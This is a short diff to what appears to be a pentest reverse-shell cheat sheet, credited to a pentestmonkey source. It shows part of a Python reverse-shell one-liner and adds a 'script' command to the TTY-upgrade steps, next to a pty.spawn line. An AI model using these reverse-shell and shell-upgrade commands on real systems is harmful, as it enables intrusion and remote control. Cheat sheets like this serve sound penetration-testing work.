@@ -58,6 +58,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ### TTY Support
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+script -qc /bin/bash /dev/null
 ```
 
 *[source](https://github.com/acole76/pentestmonkey-cheatsheets/blob/master/shells.md)*
